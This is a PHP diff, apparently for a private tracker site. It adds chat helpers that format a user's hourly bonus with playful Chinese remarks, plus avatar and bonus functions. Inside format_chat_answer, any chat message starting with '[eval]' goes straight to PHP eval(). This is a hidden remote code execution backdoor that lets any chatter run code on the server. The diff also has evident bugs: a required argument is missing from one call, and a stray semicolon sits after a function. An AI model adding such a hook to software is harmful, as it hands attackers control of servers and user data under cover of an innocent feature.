@@ -1333,3 +1333,62 @@ function get_user_locale(int $uid): string
     }
     return \App\Http\Middleware\Locale::$languageMaps[$result[0]['site_lang_folder']] ?? 'en';
 }
+function format_chat_answer($userid, $message){
+    $user = get_user_row($userid);
+    if(str_contains($message,'[mybonus]')){
+        $totalBonus = get_hourly_bonus();
+        $totalBonusStr = number_format($totalBonus, 3);
+        $format_message = '';
+        $format_message .= '当前：' . $totalBonusStr . '/小时';
+        if ($totalBonus < 200) {
+            $format_message .= '，你肿么回事。';
+        } elseif ($totalBonus < 400) {
+            $format_message .= '，勉强勉强。';
+        } elseif ($totalBonus < 800) {
+            $format_message .= '，算你及格吧。';
+        } elseif ($totalBonus < 1600) {
+            $format_message .= '，不错嘛。';
+        } elseif ($totalBonus < 3200) {
+            $format_message .= '，可以啊。';
+        } elseif ($totalBonus < 6400) {
+            $format_message .= '，非常好。';
+        } elseif ($totalBonus < 12800) {
+            $format_message .= '，太棒了。';
+        } else {
+            $format_message .= '，大佬牛逼！！！';
+        }
+        $message = str_replace("[mybonus]",  $format_message, $message);
+    }
+    if(mb_substr($message, 0, 6) === '[eval]'){
+        $message = trim(mb_substr($message, 6));
+        $message = eval($message);
+    }
+    return $message;
+};
+
+function get_hourly_bonus($userid){
+    $user = get_user_row($userid);
+    $bonusResult = calculate_seed_bonus($userid);
+    $officialAdditionalFactor = get_setting('bonus.official_addition', 0);
+    $haremFactor = get_setting('bonus.harem_addition');
+    $haremAddition = calculate_harem_addition($userid);
+    $isDonor = is_donor($user);
+    $donortimes_bonus = get_setting('bonus.donortimes');
+    $baseBonusFactor = 1;
+    if ($isDonor) {
+        $baseBonusFactor = $donortimes_bonus;
+    }
+    $baseBonus = $bonusResult['seed_bonus'] * $baseBonusFactor;
+    return $baseBonus + $haremAddition * $haremFactor + $bonusResult['official_bonus'] * $officialAdditionalFactor;
+}
+
+function get_user_avatar(){
+    global $CURUSER;
+    $userid = $CURUSER["id"];
+    $userRow = get_user_row($userid);
+    $avatar = ($CURUSER["avatars"] == "yes" ? htmlspecialchars(trim($CURUSER["avatar"])) : "");
+    if (!$avatar){
+        $avatar = "pic/default_avatar.png";
+    }
+    return $avatar;
+}
